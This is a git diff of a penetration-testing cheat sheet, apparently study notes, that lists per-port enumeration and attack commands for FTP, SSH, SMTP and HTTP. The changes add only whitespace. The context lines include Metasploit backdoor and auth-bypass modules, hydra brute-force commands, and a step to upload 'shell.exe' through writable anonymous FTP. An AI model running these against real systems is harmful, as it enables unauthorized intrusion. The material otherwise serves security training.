@@ -138,6 +138,7 @@ nmap -sV -p 21 --script=ftp-anon <target_ip>
 ```bash
 ftp <target_ip>
 ```
+
 - Use `anonymous` as username and empty password to log in.
 
 ### MSF Enumeration
@@ -150,14 +151,18 @@ msf6 > use auxiliary/scanner/ftp/anonymous
 
 - If Nmap results indicate "Anonymous FTP login permitted" with write access (WA WRITE), proceed immediately to payload delivery using `put shell.exe`.
 - If banner = `vsftpd 2.3.4`:
+
   ```text
   msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
   ```
+
 - If banner = `ProFTPD 1.3.3c`:
+
   ```text
   msf6 > use exploit/unix/ftp/proftpd_133c_backdoor
   ```
 - Brute force:
+
   ```bash
   hydra -L <user_file> -P <password_file> ftp://<target_ip>
   ```
@@ -184,13 +189,17 @@ nc -nv <target_ip> 22
 ### Exploitation
 
 - If banner contains `libssh`:
+
   ```text
   msf6 > use auxiliary/scanner/ssh/libssh_auth_bypass
   ```
+
 - Brute force:
+
   ```bash
   hydra -L <user_file> -P <password_file> ssh://<target_ip>
   ```
+
 ## Port 25: SMTP
 
 [Back to Index](#quick-index)
@@ -210,9 +219,11 @@ nmap -sV -p 25 --script=smtp-commands <target_ip>
 msf6 > use auxiliary/scanner/smtp/smtp_version
 msf6 > use auxiliary/scanner/smtp/smtp_enum
 ```
+
 ### Exploitation
 
 - If the service is Haraka with versions before 2.8.9, run:
+
 ```text
 msf6 > use exploit/unix/smtp/haraka_exec
 ```
@@ -239,6 +250,7 @@ whatweb -v -a <target_ip>
 
 gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,sh,cgi
 ```
+
 > Use web browser to view and observe the website is also cirtical to help find potential attack vectors
 
 ### Enumeration
@@ -248,6 +260,7 @@ gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -x ph
     ```bash
     wpscan --url http://<target_ip> --enumerate u,p,t,vp
     ```
+
     - Options reference:
         - `--url <URL>`: Target URL
         - `--enumerate p`: Enumerate popular plugins
